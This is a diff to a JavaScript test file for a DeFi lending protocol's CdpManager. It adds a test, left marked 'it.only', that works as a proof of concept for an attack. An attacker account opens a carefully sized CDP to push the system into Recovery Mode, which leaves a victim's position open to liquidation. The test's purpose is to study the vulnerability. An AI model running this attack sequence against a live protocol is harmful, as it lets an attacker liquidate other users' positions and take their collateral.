@@ -24,6 +24,7 @@ contract('CdpManager - Simple Liquidation with external liquidators', async acco
   let sortedCdps
   let collSurplusPool;
   let _MCR;
+  let _CCR;
   let collToken;
   let splitFeeRecipient;
   let authority;
@@ -31,6 +32,7 @@ contract('CdpManager - Simple Liquidation with external liquidators', async acco
   const openCdp = async (params) => th.openCdp(contracts, params)
 
   beforeEach(async () => {
+    await deploymentHelper.setDeployGasPrice(1000000000)
     contracts = await deploymentHelper.deployTesterContractsHardhat()
     let LQTYContracts = {}
     LQTYContracts.feeRecipient = contracts.feeRecipient;
@@ -45,6 +47,7 @@ contract('CdpManager - Simple Liquidation with external liquidators', async acco
     liq_stipend = await  contracts.cdpManager.LIQUIDATOR_REWARD();
     minDebt = await contracts.borrowerOperations.MIN_NET_COLL();
     _MCR = await cdpManager.MCR();
+    _CCR = await cdpManager.CCR();
     LICR = await cdpManager.LICR();
     borrowerOperations = contracts.borrowerOperations;
     collSurplusPool = contracts.collSurplusPool;
@@ -545,6 +548,55 @@ contract('CdpManager - Simple Liquidation with external liquidators', async acco
       let _firstICR = await cdpManager.getCurrentICR(_firstId, _price);
       let _tcr = await cdpManager.getTCR(_price);
       th.assertIsApproximatelyEqual(_firstICR, _tcr, _errorTolerance.toNumber());
+  })
+  
+  it.only("Test malicious Recovery Mode triggering within Borrower Operations: openCDP()", async() => {	  
+      await openCdp({ ICR: toBN(dec(126, 16)), extraParams: { from: owner } });
+      let _victimId = await sortedCdps.cdpOfOwnerByIndex(owner, 0);	  
+      await openCdp({ ICR: toBN(dec(129, 16)), extraParams: { from: owner } });
+	  	  
+      let _price = dec(7228, 13);
+      await priceFeed.setPrice(_price);
+	  	  
+      // modify split fee
+      assert.isTrue(authority.address == (await cdpManager.authority()));
+      const accounts = await web3.eth.getAccounts()
+      assert.isTrue(accounts[0] == (await authority.owner()));
+      let _role123 = 123;
+      let _splitRewardSig = "0xb6fe918a";//cdpManager#SET_STAKING_REWARD_SPLIT_SIG;
+      await authority.setRoleCapability(_role123, cdpManager.address, _splitRewardSig, true, {from: accounts[0]});	  
+      await authority.setUserRole(alice, _role123, true, {from: accounts[0]});
+      assert.isTrue((await authority.canCall(alice, cdpManager.address, _splitRewardSig)));
+      let _splitFee = 2399;
+      await cdpManager.setStakingRewardSplit(_splitFee, {from: alice}); 
+      assert.isTrue(_splitFee == (await cdpManager.stakingRewardSplit())); 
+	  
+      // make some fee to claim
+      await ethers.provider.send("evm_increaseTime", [43924]);
+      await ethers.provider.send("evm_mine");
+      let _oldIndex = web3.utils.toBN('1000000000000000000');
+      let _newIndex = web3.utils.toBN('1010000000000000000');
+      await collToken.setEthPerShare(_newIndex);
+	  
+      // check TCR for victim
+      let _tcrBefore = await cdpManager.getTCR(_price);
+      let _victimICRBefore = await cdpManager.getCurrentICR(_victimId, _price);
+      assert.isTrue(_tcrBefore.gt(_CCR));
+      assert.isTrue(_victimICRBefore.lt(_CCR));
+	  
+      // attacker open CDP to facilitate Recovery Mode triggering deliberately
+      let _collAmt = toBN("19661958561574716850");
+      let _ebtcAmt = toBN("1125990105069686413");
+      await collToken.deposit({from: bob, value: _collAmt});   
+      await collToken.approve(borrowerOperations.address, mv._1Be18BN, {from: bob});  
+      let _deltaRequiredIdx = await cdpManager.getDeltaIndexToTriggerRM(_newIndex, _price, _splitFee);
+      assert.isTrue(_newIndex.sub(_oldIndex).lte(_deltaRequiredIdx));  
+      let _idxBefore = await cdpManager.stFPPSg();
+      assert.isTrue(_idxBefore.eq(_oldIndex));
+      await borrowerOperations.openCdp(_ebtcAmt, th.DUMMY_BYTES32, th.DUMMY_BYTES32, _collAmt, {from: bob});
+      let _tcrAfter = await cdpManager.getTCR(_price); 
+      //console.log('new TCR after=' + _tcrAfter);
+      assert.isTrue(_tcrAfter.lt(_CCR));// now attacker successfully trigger Recovery Mode and could liquidate viction CDP below CCR
   })
   
   
